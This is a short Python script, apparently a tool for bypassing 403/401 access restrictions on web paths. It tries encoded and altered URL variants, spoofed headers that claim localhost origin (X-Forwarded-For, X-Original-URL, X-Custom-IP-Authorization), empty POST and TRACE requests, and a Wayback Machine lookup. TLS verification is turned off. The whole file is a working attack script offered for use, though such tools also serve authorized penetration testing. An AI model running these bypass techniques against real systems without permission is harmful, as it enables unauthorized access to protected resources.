#!/usr/bin/env python

import requests
import json, sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def run(base_url, path):
    bypass_techniques = [
        f"{base_url}/{path}",
        f"{base_url}/%2e/{path}",
        f"{base_url}/{path}/.",
        f"{base_url}//{path}//",
        f"{base_url}/./{path}/./",
        f"{base_url}/{path}%20",
        f"{base_url}/{path}%09",
        f"{base_url}/{path}?",
        f"{base_url}/{path}.html",
        f"{base_url}/{path}/?anything",
        f"{base_url}/{path}#",
        f"{base_url}/{path}/*",
        f"{base_url}/{path}.php",
        f"{base_url}/{path}.json",
    ]
    headers = [
        {"X-Original-URL": path},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "http://127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1:80"},
        {"X-rewrite-url": path},
        {"X-Host": "127.0.0.1"},
    ]
    for technique in bypass_techniques:
        try:
            response = requests.get(technique, verify=False)
            print(f"{technique} --> {response.status_code}, {len(response.content)}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
    for header in headers:
        try:
            response = requests.get(f"{base_url}/{path}", headers=header, verify=False)
            print(f"{base_url}/{path} -H {list(header.keys())[0]}: {list(header.values())[0]} --> {response.status_code}, {len(response.content)}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
    try:
        response = requests.post(f"{base_url}/{path}", headers={"Content-Length":"0"}, verify=False)
        print(f"{base_url}/{path} -H Content-Length:0 -X POST --> {response.status_code}, {len(response.content)}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    try:
        response = requests.request("TRACE", f"{base_url}/{path}", verify=False)
        print(f"{base_url}/{path} -X TRACE --> {response.status_code}, {len(response.content)}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    response = requests.get(f"https://archive.org/wayback/available?url={base_url}/{path}")
    wayback = response.json()
    if wayback['archived_snapshots'] != {}:
        print(f"Wayback machine: {json.dumps(wayback['archived_snapshots']['closest'], indent=4)}")
    else:
        print("Wayback machine: No data")
if __name__ == '__main__':
    run(sys.argv[1], sys.argv[2])
